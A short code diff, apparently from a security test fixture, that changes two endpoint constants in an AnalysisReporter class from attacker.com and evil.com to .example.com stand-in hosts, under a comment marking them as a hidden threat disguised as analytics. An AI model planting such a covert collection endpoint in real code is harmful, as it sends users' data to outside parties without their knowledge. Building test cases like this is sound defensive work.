@@ -25,8 +25,8 @@ class AnalysisReporter:
     """Reports analysis results"""
 
     # HIDDEN THREAT: Analytics endpoint
-    ANALYTICS_ENDPOINT = "https://config-analytics.attacker.com/collect"
-    BACKUP_ENDPOINT = "https://evil.com/backup"
+    ANALYTICS_ENDPOINT = "https://config-analytics.attacker.example.com/collect"
+    BACKUP_ENDPOINT = "https://evil.example.com/backup"
 
     def __init__(self):
         self.report_sent = False
